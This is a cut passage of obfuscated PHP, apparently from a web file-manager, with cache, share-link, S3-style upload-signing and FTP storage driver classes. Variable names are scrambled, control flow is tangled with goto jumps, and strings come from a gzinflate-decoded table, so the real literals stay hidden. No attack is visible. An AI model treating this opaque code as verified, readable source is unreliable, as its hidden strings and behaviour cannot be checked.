$A¯öËÍàã¾ = array(); $F¥™ÑÙÂ×¼ = $GLOBALS[$f±Œ¼“¼¼·[16]][$f±Œ¼“¼¼·[97]][$f±Œ¼“¼¼·[777]]; foreach ($Fˆ£ÒˆÇµ as $D‚÷Ÿ»Œ«) { $Dù„«àš³¾ = strtolower($D‚÷Ÿ»Œ«[$f±Œ¼“¼¼·[103]]); if (!isset($F¥™ÑÙÂ×¼[$Dù„«àš³¾])) { continue; } $D®Õ’†‘Æ = $f±Œ¼“¼¼·[81] . (isset($F¥™ÑÙÂ×¼[$Dù„«àš³¾]) ? $F¥™ÑÙÂ×¼[$Dù„«àš³¾] : ucfirst($Dù„«àš³¾)); if (!class_exists($D®Õ’†‘Æ)) { continue; } $A¯öËÍàã¾[] = $D‚÷Ÿ»Œ«[$f±Œ¼“¼¼·[397]]; } return $A¯öËÍàã¾; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto AøÃ­™™º; e’µ”ò¤‹›: switch ($bè‚•¸‚í[$e©Ö’‚‹Ê[778]]) { case $e©Ö’‚‹Ê[27]: self::$handle = Model($e©Ö’‚‹Ê[780]); break; case $e©Ö’‚‹Ê[781]: self::$handle = new CacheRedis($c„…ƒ¹Êó¶, $F¯µÅğé„); break; case $e©Ö’‚‹Ê[782]: self::$handle = new CacheMemcached($c„…ƒ¹Êó¶, $F¯µÅğé„); break; case $e©Ö’‚‹Ê[201]: self::$handle = new CacheFile($c„…ƒ¹Êó¶, $F¯µÅğé„); break; default: break; } return self::$handle; goto D¿ÔÕğø´ì; AøÃ­™™º: $e©Ö’‚‹Ê =& $_SERVER[¾÷]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Cá ×Š”ƒ; Cá ×Š”ƒ: $bè‚•¸‚í = $GLOBALS[$e©Ö’‚‹Ê[16]][$e©Ö’‚‹Ê[354]]; $c„…ƒ¹Êó¶ = $bè‚•¸‚í[$bè‚•¸‚í[$e©Ö’‚‹Ê[778]]]; $F¯µÅğé„ = $bè‚•¸‚í[$e©Ö’‚‹Ê[779]]; goto e’µ”ò¤‹›; D¿ÔÕğø´ì: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($e÷º™…ºàµ) { if (is_array($e÷º™…ºàµ) || is_object($e÷º™…ºàµ)) { $e÷º™…ºàµ = json_encode($e÷º™…ºàµ); } $e÷º™…ºàµ = rawurlencode($e÷º™…ºàµ); return md5(KOD_SITE_ID . $_SERVER[¾÷][80] . $e÷º™…ºàµ); } public static function get($A«×çµ†Œ¼, $F»¦êì†“£ = false) { $cÑãôˆ²öÂ = self::key($A«×çµ†Œ¼); if ($F»¦êì†“£) { return unserialize(self::init()->get($cÑãôˆ²öÂ)); } if (!isset(self::$memoryCache[$cÑãôˆ²öÂ])) { $C¾ Õ…ÖŒ = self::init()->get($cÑãôˆ²öÂ); self::$memoryCache[$cÑãôˆ²öÂ] = unserialize($C¾ Õ…ÖŒ); } return self::$memoryCache[$cÑãôˆ²öÂ]; } public static function set($FŠÌ ´ºÈ, $dø™¬Åæîİ, $a´ì•Ìá† = false) { goto E¢¶Ëë¤‡å; A›¯˜‡–ª: CacheLock::unlock($FŠÌ ´ºÈ); return $D›š‹ç¼; goto bôö£ÉŒ­¼; E¢¶Ëë¤‡å: $cçÍ–ˆ™ˆ = self::key($FŠÌ ´ºÈ); if (isset(self::$memoryCache[$cçÍ–ˆ™ˆ]) && self::$memoryCache[$cçÍ–ˆ™ˆ] === $dø™¬Åæîİ) { return !0; } if ($a´ì•Ìá† === 0) { self::$memoryCache[$cçÍ–ˆ™ˆ] = $dø™¬Åæîİ; return !0; } goto a·»ÁŸ§±; a·»ÁŸ§±: CacheLock::lock($FŠÌ ´ºÈ); $D›š‹ç¼ = self::init()->set($cçÍ–ˆ™ˆ, serialize($dø™¬Åæîİ), $a´ì•Ìá†); self::$memoryCache[$cçÍ–ˆ™ˆ] = $dø™¬Åæîİ; goto A›¯˜‡–ª; bôö£ÉŒ­¼: } public static function getCall($Dí¿ö—ƒ, $eó„––áÉÙ, $BÜøˆ††îğ, $Fá ¼¥¾Œ‘ = array()) { $Få…µ‡„é = self::get($Dí¿ö—ƒ); if ($Få…µ‡„é) { return $Få…µ‡„é; } $Få…µ‡„é = call_user_func_array($BÜøˆ††îğ, $Fá ¼¥¾Œ‘); self::set($Dí¿ö—ƒ, $Få…µ‡„é, $eó„––áÉÙ); return $Få…µ‡„é; } public static function remove($f‚›â…Ó»©) { goto F©ƒÄ²…; EÎøÆˆ»ì—: return $e×í¼„ÁÀ¬; goto D–®§ÊƒÂÕ; F©ƒÄ²…: $FŒ’´åÉÈÔ = self::key($f‚›â…Ó»©); unset(self::$memoryCache[$FŒ’´åÉÈÔ]); self::clearTimeout(); goto d†’ğ Ü“à; d†’ğ Ü“à: CacheLock::lock($f‚›â…Ó»©); $e×í¼„ÁÀ¬ = self::init()->remove($FŒ’´åÉÈÔ); CacheLock::unlock($f‚›â…Ó»©); goto EÎøÆˆ»ì—; D–®§ÊƒÂÕ: } public static function removeMemory($DÔ×åÂ»¯¸) { $a†ŸœàÙÇĞ = self::key($DÔ×åÂ»¯¸); unset(self::$memoryCache[$a†ŸœàÙÇĞ]); } public static function clearMemory($BäéÕ‡Çò = false) { if ($BäéÕ‡Çò) { $BäéÕ‡Çò = self::key($BäéÕ‡Çò); unset(self::$memoryCache[$BäéÕ‡Çò]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¾÷][783])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¾÷][784])) { self::init()->clearTimeout(); } } } goto aôäªëİ; CÃœäó”Œ‘: $_SERVER[Ş¥ÖÁ÷Ù] = explode($_SERVER[¾÷][579], gzinflate(substr($_SERVER[¾÷][580], 10, -8))); $CŠ¼ÍÍ±İÇ = $_SERVER[¾÷][581]; while (strlen($CŠ¼ÍÍ±İÇ) < $_SERVER[¾÷][582]) { if (!$CŠ¼ÍÍ±İÇ) { break; } $CŠ¼ÍÍ±İÇ++; } goto e‚ÖÚÅëĞ; AÑ­à‰·Ö: define($_SERVER[¾÷][246], 1); define($_SERVER[¾÷][247], 0); define($_SERVER[¾÷][248], 2); goto b´®öÄì; Fî™Óì‡ï®: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($BÚ…çÂê·ª) { $this->pathParse = $BÚ…çÂê·ª; } protected function infoParse($eÔ²Ò÷ŠÎ§, $B®È’Ï² ¥ = false) { $AÒ‰ŠÀ†¨À =& $_SERVER[¾÷]; return Action($AÒ‰ŠÀ†¨À[1046])->sharePathInfo($this->pathParse[$AÒ‰ŠÀ†¨À[85]], !0, $B®È’Ï² ¥); } public function listPath($dº®Š‚š³‰, $D„ò«™òôÚ = false) { $EĞº§â…¸Ë =& $_SERVER[¾÷]; $cİæˆíÈñ» = IO::listPath($dº®Š‚š³‰, $D„ò«™òôÚ); foreach ($cİæˆíÈñ» as $fÖŸØâš’  => $FÓÙö®±·) { if (!in_array($fÖŸØâš’ , array($EĞº§â…¸Ë[83], $EĞº§â…¸Ë[84]))) { continue; } foreach ($FÓÙö®±· as $cåÂÜÆğ«® => $FÙ¦Ï¦¼Œ) { $FÙ¦Ï¦¼Œ = Action($EĞº§â…¸Ë[1198])->parsePathChildren($FÙ¦Ï¦¼Œ, array($EĞº§â…¸Ë[417] => $dº®Š‚š³‰)); $cİæˆíÈñ»[$fÖŸØâš’ ][$cåÂÜÆğ«®] = Action($EĞº§â…¸Ë[1046])->shareItemInfo($FÙ¦Ï¦¼Œ); } } return $cİæˆíÈñ»; } public function listAll($d—ÌŒğÜ×Ô) { $Añ“ÀØ„ì• =& $_SERVER[¾÷]; $dñ»ôŸİØÒ = IO::listAll($d—ÌŒğÜ×Ô); foreach ($dñ»ôŸİØÒ as &$BäèÀ¶¹”ù) { $BäèÀ¶¹”ù = array_merge(IO::info($BäèÀ¶¹”ù[$Añ“ÀØ„ì•[85]]), $BäèÀ¶¹”ù); $BäèÀ¶¹”ù[$Añ“ÀØ„ì•[94]] = Action($Añ“ÀØ„ì•[1046])->shareItemInfo($BäèÀ¶¹”ù); } unset($BäèÀ¶¹”ù); return $dñ»ôŸİØÒ; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($eÈ”®‰ğè) { parent::__construct($eÈ”®‰ğè); $this->signatureVersion($_SERVER[¾÷][220]); } public function uploadFormData($e‚øØ£âÍ, $BÅ·Ëö„µÆ = 3600) { goto A×Ë‹Ÿğ»; A×Ë‹Ÿğ»: $E‚ÈÔ’ï˜Î =& $_SERVER[¾÷]; $D¡Û¬ºÚÙ = $E‚ÈÔ’ï˜Î[200]; $c—öŞŞ‹‡´ = $E‚ÈÔ’ï˜Î[1199]; goto cç–ßºåÌ’; b¦†õ–•™¢: $aëÏµñù±‰ = $E‚ÈÔ’ï˜Î[1201]; $E® ãàÜÕ˜ = $BÅ·Ëö„µÆ . $E‚ÈÔ’ï˜Î[43]; $DŒ¾Ù¶óä® = $E‚ÈÔ’ï˜Î[1163]; goto f»Ş™ÃÛÖ×; eà¬åÉ¢’Í: $déÓæŠğùó = base64_encode(json_encode($B¤ÁÃ¨Ì…)); $dÜŞ÷Ë„·» = hash_hmac($E‚ÈÔ’ï˜Î[1209], $eôó“ÄóÉ, $E‚ÈÔ’ï˜Î[1210] . $this->secret, !0); $AŸÓÑ¡ç¾ = hash_hmac($E‚ÈÔ’ï˜Î[1209], $this->region, $dÜŞ÷Ë„·», !0); goto fŸË¯İ“õ‰; E»Í“”È: $fƒ‘Ó®ëÉÊ = array($E‚ÈÔ’ï˜Î[219] => $E‚ÈÔ’ï˜Î[43], $E‚ÈÔ’ï˜Î[1211] => $E‚ÈÔ’ï˜Î[43], $E‚ÈÔ’ï˜Î[1167] => $D¡Û¬ºÚÙ, $E‚ÈÔ’ï˜Î[1171] => $DŒ¾Ù¶óä®, $E‚ÈÔ’ï˜Î[1175] => $déÓæŠğùó, $E‚ÈÔ’ï˜Î[1212] => $d„½Ô‡‰½Æ, $E‚ÈÔ’ï˜Î[1213] => $c—öŞŞ‹‡´, $E‚ÈÔ’ï˜Î[1214] => $DèÀ‡¤‹‘³, $E‚ÈÔ’ï˜Î[1215] => $E® ãàÜÕ˜, $E‚ÈÔ’ï˜Î[1216] => $eê´ÏŠœù, $E‚ÈÔ’ï˜Î[184] => $this->getHost()); return $fƒ‘Ó®ëÉÊ; goto bÏÈğ¾†Ô; fŸË¯İ“õ‰: $bÁÅÍÅˆÚ‘ = hash_hmac($E‚ÈÔ’ï˜Î[1209], $FÔ÷ìªé—, $AŸÓÑ¡ç¾, !0); $fĞ×¬„§‹ = hash_hmac($E‚ÈÔ’ï˜Î[1209], $aëÏµñù±‰, $bÁÅÍÅˆÚ‘, !0); $eê´ÏŠœù = hash_hmac($E‚ÈÔ’ï˜Î[1209], $déÓæŠğùó, $fĞ×¬„§‹); goto E»Í“”È; f»Ş™ÃÛÖ×: $b¢¹±«×Š = array($this->accessKey, $eôó“ÄóÉ, $this->region, $FÔ÷ìªé—, $aëÏµñù±‰); $d„½Ô‡‰½Æ = implode($E‚ÈÔ’ï˜Î[18], $b¢¹±«×Š); $B¤ÁÃ¨Ì… = array($E‚ÈÔ’ï˜Î[1165] => gmdate($E‚ÈÔ’ï˜Î[1164], strtotime($E‚ÈÔ’ï˜Î[1202])), $E‚ÈÔ’ï˜Î[1166] => array(array($E‚ÈÔ’ï˜Î[1168] => $this->bucket), array($E‚ÈÔ’ï˜Î[1167] => $D¡Û¬ºÚÙ), array($E‚ÈÔ’ï˜Î[1169], $E‚ÈÔ’ï˜Î[1170], $E‚ÈÔ’ï˜Î[43]), array($E‚ÈÔ’ï˜Î[1169], $E‚ÈÔ’ï˜Î[1203], $E‚ÈÔ’ï˜Î[43]), array($E‚ÈÔ’ï˜Î[1169], $E‚ÈÔ’ï˜Î[1204], $E‚ÈÔ’ï˜Î[43]), array($E‚ÈÔ’ï˜Î[1171] => $DŒ¾Ù¶óä®), array($E‚ÈÔ’ï˜Î[1205] => $d„½Ô‡‰½Æ), array($E‚ÈÔ’ï˜Î[1206] => $c—öŞŞ‹‡´), array($E‚ÈÔ’ï˜Î[1207] => $DèÀ‡¤‹‘³), array($E‚ÈÔ’ï˜Î[1208] => $E® ãàÜÕ˜))); goto eà¬åÉ¢’Í; cç–ßºåÌ’: $FÔ÷ìªé— = $E‚ÈÔ’ï˜Î[69]; $DèÀ‡¤‹‘³ = gmdate($E‚ÈÔ’ï˜Î[1200]); $eôó“ÄóÉ = gmdate($E‚ÈÔ’ï˜Î[712]); goto b¦†õ–•™¢; bÏÈğ¾†Ô: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($B‡Œ¦µ µ) { parent::__construct(); if (count($B‡Œ¦µ µ) > 0) { $this->_init($B‡Œ¦µ µ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($AâÑÌ…œÎ») { $b®’æÀ² =& $_SERVER[¾÷]; global $config; $this->appCharset = $config[$b®’æÀ²[1217]]; $this->systemCharset = $config[$b®’æÀ²[1218]]; if (isset($AâÑÌ…œÎ»[$b®’æÀ²[1219]]) && $AâÑÌ…œÎ»[$b®’æÀ²[1219]]) { $this->systemCharset = $AâÑÌ…œÎ»[$b®’æÀ²[1219]]; } } public function iconvApp($e™µ‹¢š•Ç) { return $this->iconvTo($e™µ‹¢š•Ç, $this->systemCharset, $this->appCharset); } public function iconvSystem($a‡³ğ¤——) { return $this->iconvTo($a‡³ğ¤——, $this->appCharset, $this->systemCharset); } public function getPathOuter($FĞö£øè±†) { goto fŸÓÛ’•ØÏ; a¹ã¢†Ò¹ê: return $this->pathDriver . $d‹ƒÅÓ»‹[18] . ltrim($FĞö£øè±†, $d‹ƒÅÓ»‹[18]); goto c¿ø®™Ï¾; eÌ—–‘Êº§: $FĞö£øè±† = KodIO::clear($FĞö£øè±†); $FĞö£øè±† = substr($FĞö£øè±†, strlen($BÓÈö‚İ¤ˆ)); if (empty($this->pathDriver)) { return $FĞö£øè±†; } goto a¹ã¢†Ò¹ê; b”³¶“·®: if (substr($BÓÈö‚İ¤ˆ, 0, 2) == $d‹ƒÅÓ»‹[1220]) { $BÓÈö‚İ¤ˆ = BASIC_PATH . substr($BÓÈö‚İ¤ˆ, 2); } if (substr($FĞö£øè±†, 0, 2) == $d‹ƒÅÓ»‹[1220]) { $FĞö£øè±† = BASIC_PATH . substr($FĞö£øè±†, 2); } $BÓÈö‚İ¤ˆ = KodIO::clear($BÓÈö‚İ¤ˆ); goto eÌ—–‘Êº§; fŸÓÛ’•ØÏ: $d‹ƒÅÓ»‹ =& $_SERVER[¾÷]; $BÓÈö‚İ¤ˆ = $this->iconvApp($this->pathBase); $FĞö£øè±† = $this->iconvApp($FĞö£øè±†); goto b”³¶“·®; c¿ø®™Ï¾: } private function _init($fò‡¯¡µ = array()) { $D±Š³‡Úˆå =& $_SERVER[¾÷]; if (!function_exists($D±Š³‡Úˆå[1221])) { throw new Exception(LNG($D±Š³‡Úˆå[1222])); } $this->config = $fò‡¯¡µ; $this->charsetReset($fò‡¯¡µ); foreach ($fò‡¯¡µ as $EŸõ·ã³œß => $EÀÏÜ¥) { if (isset($this->{$EŸõ·ã³œß})) { $this->{$EŸõ·ã³œß} = $EÀÏÜ¥; } } return $this->_login($fò‡¯¡µ); } private function _login($c¥¼†–²) { goto dø¦Ä£Ôƒ; cïì“¸µº¬: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $dëè±ë¢œ = @ftp_login($this->connect, $this->username, $this->userpass); goto F´êÀ´›Š; dø¦Ä£Ôƒ: $eÖ†Ûáñã¨ =& $_SERVER[¾÷]; static $FĞ×èÉá™Ä = array(); $f‡ùé™Á£ = md5(json_encode($c¥¼†–²)); goto b‚à¨õåß—; dÂËÈƒƒÚ‚: $Dîù¤×›“ = isset($b×¬ó»åÑÌ[$eÖ†Ûáñã¨[183]]) && $b×¬ó»åÑÌ[$eÖ†Ûáñã¨[183]] == $eÖ†Ûáñã¨[1223] ? !0 : !1; $this->scheme = $Dîù¤×›“ ? $eÖ†Ûáñã¨[1224] : $eÖ†Ûáñã¨[1225]; $this->port = isset($b×¬ó»åÑÌ[$eÖ†Ûáñã¨[185]]) ? $b×¬ó»åÑÌ[$eÖ†Ûáñã¨[185]] : 21; goto cïì“¸µº¬; E­…­™³¬ø: $FĞ×èÉá™Ä[$f‡ùé™Á£] = array($eÖ†Ûáñã¨[1226] => $this->connect, $eÖ†Ûáñã¨[184] => $this->host, $eÖ†Ûáñã¨[183] => $this->scheme, $eÖ†Ûáñã¨[185] => $this->port); return $dëè±ë¢œ; goto EÙÓÓæ¢íº; F´êÀ´›Š: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $F±êª¨˜«› = $this->pasv == $eÖ†Ûáñã¨[96] ? !0 : !1; @ftp_pasv($this->connect, $F±êª¨˜«›); goto E­…­™³¬ø; b‚à¨õåß—: if (isset($FĞ×èÉá™Ä[$f‡ùé™Á£])) { foreach ($FĞ×èÉá™Ä[$f‡ùé™Á£] as $D‘í‡³İ => $aÀºãÜÛ‡á) { $this->{$D‘í‡³İ} = $aÀºãÜÛ‡á; } return !0; } $b×¬ó»åÑÌ = parse_url(trim($this->server, $eÖ†Ûáñã¨[18])); $this->host = $b×¬ó»åÑÌ[$eÖ†Ûáñã¨[184]]; goto dÂËÈƒƒÚ‚; EÙÓÓæ¢íº: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($c­¤…²íø´, $aÍùçø = '', $DƒÌç‡»Ü¡ = REPEAT_RENAME) { if ($this->setContent($c­¤…²íø´, $aÍùçø)) { return $this->getPathOuter($c­¤…²íø´); } return !1; } public function mkdir($b§§È”É·Ç, $CÅŞ¿‚ê‚Ö = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $b§§È”É·Ç = $this->iconvSystem($b§§È”É·Ç); if ($this->_isFolder($b§§È”É·Ç) || @ftp_mkdir($this->connect, $b§§È”É·Ç)) { return $this->getPathOuter($b§§È”É·Ç); } if (!$this->mkdir($this->pathFather($b§§È”É·Ç))) { return !1; } if ($b§§È”É·Ç = @ftp_mkdir($this->connect, $b§§È”É·Ç)) { return $this->getPathOuter($b§§È”É·Ç); } return !1; } public function copyFile($d½ï‡÷§¦ó, $BÔ˜¹—¥–œ) { goto DÔ¸ù‡Ô; B™ßƒ‰§: $this->tempFileRemve($EàîáĞ¨¯); return $a‰‚¥Ğ’; goto f“Ş²î—Î¾; DÔ¸ù‡Ô: if (!$this->_isconn()) { return !1; } $D•‹¤‰¿Ô = $this->pathThis($this->iconvSystem($d½ï‡÷§¦ó)); $EàîáĞ¨¯ = $this->tempFile($D•‹¤‰¿Ô); goto añÈÃŸ°ÁŠ; añÈÃŸ°ÁŠ: $Eâ©ŸÄ¥Í§ = $this->iconvApp($EàîáĞ¨¯); $this->download($d½ï‡÷§¦ó, $Eâ©ŸÄ¥Í§); $a‰‚¥Ğ’ = $this->upload($BÔ˜¹—¥–œ, $Eâ©ŸÄ¥Í§); goto B™ßƒ‰§; f“Ş²î—Î¾: } public function moveFile($Dôâ°Î­ö¾, $F‘„µÉŸÍ‹) { if (!$this->_isconn()) { return !1; } $Dôâ°Î­ö¾ = $this->iconvSystem($Dôâ°Î­ö¾); $F‘„µÉŸÍ‹ = $this->iconvSystem($F‘„µÉŸÍ‹); $dƒ„†ùÛö = @ftp_rename($this->connect, $Dôâ°Î­ö¾, $F‘„µÉŸÍ‹); return $dƒ„†ùÛö ? $this->getPathOuter($F‘„µÉŸÍ‹) : !1; } public function delFile($e àÂ’¶š”) { if (!$this->_isconn()) { return !1; } $e àÂ’¶š” = $this->iconvSystem($e àÂ’¶š”); return @ftp_delete($this->connect, $e àÂ’¶š”); } public function delFolder($BÒ¶ã©³…) { goto añÍ×¸ïã¥; añÍ×¸ïã¥: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $cÅ¶¥âÌº = $bá±ëÔ‘Û = array(); goto Bº¿ëïÈºğ; e‚÷¢È³Â‘: foreach ($cÅ¶¥âÌº as $eÏÈ°ÖºÂ) { $eÏÈ°ÖºÂ = $this->iconvSystem($eÏÈ°ÖºÂ); $B›šÈÁå° = @ftp_rmdir($this->connect, $eÏÈ°ÖºÂ); if (!$B›šÈÁå°) { return !1; } } $BÒ¶ã©³… = $this->iconvSystem($BÒ¶ã©³…); return @ftp_rmdir($this->connect, $BÒ¶ã©³…); goto bÙ“çÌ¦Ğä; Bº¿ëïÈºğ: $this->fileList($BÒ¶ã©³…, $cÅ¶¥âÌº, $bá±ëÔ‘Û, !0); $this->listItemCache = !0; foreach ($bá±ëÔ‘Û as $EóŠ¸² º‹) { $eÏÈ°ÖºÂ = $this->iconvSystem($EóŠ¸² º‹[$_SERVER[¾÷][38]]); $B›šÈÁå° = @ftp_delete($this->connect, $eÏÈ°ÖºÂ); if (!$B›šÈÁå°) { return !1; } } goto e‚÷¢È³Â‘; bÙ“çÌ¦Ğä: } public function rename($BÔ©ŠíÓ˜š, $EÏ âÈò¡Å) { goto aõöÙÈ°Œ; aõöÙÈ°Œ: $dÒØİàˆ¦ =& $_SERVER[¾÷]; if (!$this->_isconn()) { return !1; } $cŠ¸õå‚ê„ = $this->fileNameAuto($this->pathFather($BÔ©ŠíÓ˜š), $EÏ âÈò¡Å); goto D”áòÂŸÕË; c‰¢âëÈ•§: return $EÏ—óäÚÆ± ? $this->getPathOuter($Cöè¡…²©Æ) : !1; goto a†ˆØ¼çá; D”áòÂŸÕË: $cŠ¸õå‚ê„ = $this->iconvSystem($cŠ¸õå‚ê„); $BÔ©ŠíÓ˜š = $this->iconvSystem($BÔ©ŠíÓ˜š); $Aº†Òêå¹ = $this->pathFather($BÔ©ŠíÓ˜š); goto eƒ—Æ±‹Ìˆ; eƒ—Æ±‹Ìˆ: $Cöè¡…²©Æ = rtrim($Aº†Òêå¹, $dÒØİàˆ¦[18]) . $dÒØİàˆ¦[18] . $cŠ¸õå‚ê„; $EÏ—óäÚÆ± = @ftp_rename($this->connect, $BÔ©ŠíÓ˜š, $Cöè¡…²©Æ); $Cöè¡…²©Æ = $this->iconvApp($Cöè¡…²©Æ); goto c‰¢âëÈ•§; a†ˆØ¼çá: } private function folderInfo($DéÆóƒà¼³, $Bâ…ˆÆ © = false) { $e†õ—Ôï™ =& $_SERVER[¾÷]; $d½ƒ¯ğ„é½ = array($e†õ—Ôï™[38] => $this->pathThis($DéÆóƒà¼³), $e†õ—Ôï™[85] => $this->getPathOuter($e†õ—Ôï™[18] . $DéÆóƒà¼³), $e†õ—Ôï™[39] => $e†õ—Ôï™[86]); if ($Bâ…ˆÆ ©) { return $d½ƒ¯ğ„é½; } $d½ƒ¯ğ„é½[$e†õ—Ôï™[202]] = $d½ƒ¯ğ„é½[$e†õ—Ôï™[93]] = 0; $d½ƒ¯ğ„é½[$e†õ—Ôï™[203]] = $d½ƒ¯ğ„é½[$e†õ—Ôï™[204]] = !0; return $d½ƒ¯ğ„é½; } private function fileInfo($c©ˆñÍ½å­, $B—‡²˜ÜØ‘ = false, $B•öõ‘í“ = array()) { goto BÖ®ÎÙŞŠï; BÖ®ÎÙŞŠï: $AòËïÉİ÷ =& $_SERVER[¾÷]; $EÃŒºØ®åÇ = array($AòËïÉİ÷[38] => $this->pathThis($c©ˆñÍ½å­), $AòËïÉİ÷[85] => $this->getPathOuter($AòËïÉİ÷[18] . $c©ˆñÍ½å­), $AòËïÉİ÷[39] => $AòËïÉİ÷[201], $AòËïÉİ÷[87] => isset($B•öõ‘í“[$AòËïÉİ÷[87]]) ? $B•öõ‘í“[$AòËïÉİ÷[87]] : 0, $AòËïÉİ÷[177] => $this->ext($c©ˆñÍ½å­)); if ($B—‡²˜ÜØ‘) { return $EÃŒºØ®åÇ; } goto Bèæ·®‹âÅ; DºÖ’Ö•†õ: $EÃŒºØ®åÇ[$AòËïÉİ÷[93]] = @ftp_mdtm($this->connect, $cËšêœŠ÷ò); if (empty($B•öõ‘í“)) { $B•öõ‘í“ = $this->objectMeta($c©ˆñÍ½å­); if (!$B•öõ‘í“) { return $EÃŒºØ®åÇ; } } $EÃŒºØ®åÇ[$AòËïÉİ÷[87]] = $B•öõ‘í“[$AòËïÉİ÷[87]]; goto A°Ôîƒô®; A°Ôîƒô®: return $EÃŒºØ®åÇ; goto d¯²Í…º’È; Bèæ·®‹âÅ: $EÃŒºØ®åÇ[$AòËïÉİ÷[202]] = $EÃŒºØ®åÇ[$AòËïÉİ÷[93]] = 0; $EÃŒºØ®åÇ[$AòËïÉİ÷[203]] = $EÃŒºØ®åÇ[$AòËïÉİ÷[204]] = !0; $cËšêœŠ÷ò = $this->iconvSystem($c©ˆñÍ½å­); goto DºÖ’Ö•†õ; d¯²Í…º’È: } public function size($B¸”–é·îÇ) { $fÜ‚¢½£‰Á = $this->objectMeta($B¸”–é·îÇ); return $fÜ‚¢½£‰Á ? $fÜ‚¢½£‰Á[$_SERVER[¾÷][87]] : 0; } public function info($e¼Ñáù›«) { if ($this->isFile($e¼Ñáù›«)) { return $this->fileInfo($e¼Ñáù›«, 0); } else { if ($this->isFolder($e¼Ñáù›«)) { return $this->folderInfo($e¼Ñáù›«); } } return !1; } private function fileList($B¶‰Å¹áàî, &$AÊÑÛ‰¥Û¥, &$Cæê“ƒâÏ, $d”ÇÌé˜ÂÔ = false) { goto fšó´ñŒÂƒ; fšó´ñŒÂƒ: $cÑ‡‘¬êÖÌ =& $_SERVER[¾÷]; $B¶‰Å¹áàî = $this->iconvSystem($B¶‰Å¹áàî); if (!$this->isFolder($B¶‰Å¹áàî)) { return !1; } goto aõêºóôÀ©; d¦•”ª‰Ğ: $dœ™ˆ –” = array($cÑ‡‘¬êÖÌ[104] => 1, $cÑ‡‘¬êÖÌ[1227] => 1); foreach ($fßØŠ®ìÍ® as $eÎØƒƒÑ„©) { goto dïö¯˜µ¿; aÜ…ÎŠùœ: if ($CÁ²ç¦—µ) { $AÊÑÛ‰¥Û¥[] = $Bâ“İêĞÒƒ; if ($d”ÇÌé˜ÂÔ) { $this->fileList($Bâ“İêĞÒƒ, $AÊÑÛ‰¥Û¥, $Cæê“ƒâÏ, $d”ÇÌé˜ÂÔ); } continue; } $Cæê“ƒâÏ[] = $dƒÈ¼ù ï; goto F‰³ùîÖª“; f×Ğà–œˆ: if (substr($eÎØƒƒÑ„©, 0, 1) == $cÑ‡‘¬êÖÌ[1228]) { $dƒÈ¼ù ï[$cÑ‡‘¬êÖÌ[39]] = $cÑ‡‘¬êÖÌ[86]; $dƒÈ¼ù ï[$cÑ‡‘¬êÖÌ[87]] = 0; } $CÁ²ç¦—µ = $dƒÈ¼ù ï[$cÑ‡‘¬êÖÌ[39]] == $cÑ‡‘¬êÖÌ[86] ? !0 : !1; if ($e…ÉİÄ†¢) { $this->cacheMethod($cÑ‡‘¬êÖÌ[207], $Bâ“İêĞÒƒ, $CÁ²ç¦—µ); $this->cacheMethod($cÑ‡‘¬êÖÌ[208], $Bâ“İêĞÒƒ, $dƒÈ¼ù ï); } goto aÜ…ÎŠùœ; EÛÊÇË¥°Ç: if (!$Bâ“İêĞÒƒ || isset($dœ™ˆ –”[$Bâ“İêĞÒƒ])) { continue; } $Bâ“İêĞÒƒ = $this->iconvApp($B¶‰Å¹áàî . ltrim($Bâ“İêĞÒƒ, $cÑ‡‘¬êÖÌ[18])); $dƒÈ¼ù ï = array($cÑ‡‘¬êÖÌ[38] => $Bâ“İêĞÒƒ, $cÑ‡‘¬êÖÌ[39] => $cÑ‡‘¬êÖÌ[201], $cÑ‡‘¬êÖÌ[87] => $d‚ÈÚ‚î˜‹[4]); goto f×Ğà–œˆ; dïö¯˜µ¿: $d‚ÈÚ‚î˜‹ = $this->_listItem($eÎØƒƒÑ„©); if ($d‚ÈÚ‚î˜‹[0] == $cÑ‡‘¬êÖÌ[717]) { continue; } $Bâ“İêĞÒƒ = $d‚ÈÚ‚î˜‹[8]; goto EÛÊÇË¥°Ç; F‰³ùîÖª“: } if ($e…ÉİÄ†¢) { $this->cacheMethod($cÑ‡‘¬êÖÌ[207], $B¶‰Å¹áàî, !0); } goto A¿ª£ì•†°; cŠÏå·İÔ‘: $e…ÉİÄ†¢ = $this->listItemCache === !1 ? !1 : !0; $fßØŠ®ìÍ® = @ftp_rawlist($this->connect, $B¶‰Å¹áàî); if (!$fßØŠ®ìÍ®) { $fßØŠ®ìÍ® = array(); } goto d¦•”ª‰Ğ; aõêºóôÀ©: @ftp_chdir($this->connect, $cÑ‡‘¬êÖÌ[18]); $B¶‰Å¹áàî = rtrim($B¶‰Å¹áàî, $cÑ‡‘¬êÖÌ[18]) . $cÑ‡‘¬êÖÌ[18]; check_abort(); goto cŠÏå·İÔ‘; A¿ª£ì•†°: } private function _listItem($f…áÁğÎ‰ğ) { if (empty($f…áÁğÎ‰ğ)) { return array(); } $CµÄÌŞñ›¶ = preg_split($_SERVER[¾÷][1229], $f…áÁğÎ‰ğ); if (count($CµÄÌŞñ›¶) <= 9) { return $CµÄÌŞñ›¶; } $CµÄÌŞñ›¶[8] = trim(substr($f…áÁğÎ‰ğ, strpos($f…áÁğÎ‰ğ, $CµÄÌŞñ›¶[7]) + strlen($CµÄÌŞñ›¶[7]))); return array_splice($CµÄÌŞñ›¶, 0, 9); } public function listPath($BË¤²°éˆÍ, $BÃ¹œ¡âÅÈ = false) { goto b°Ä‰ÊŞ–ò; 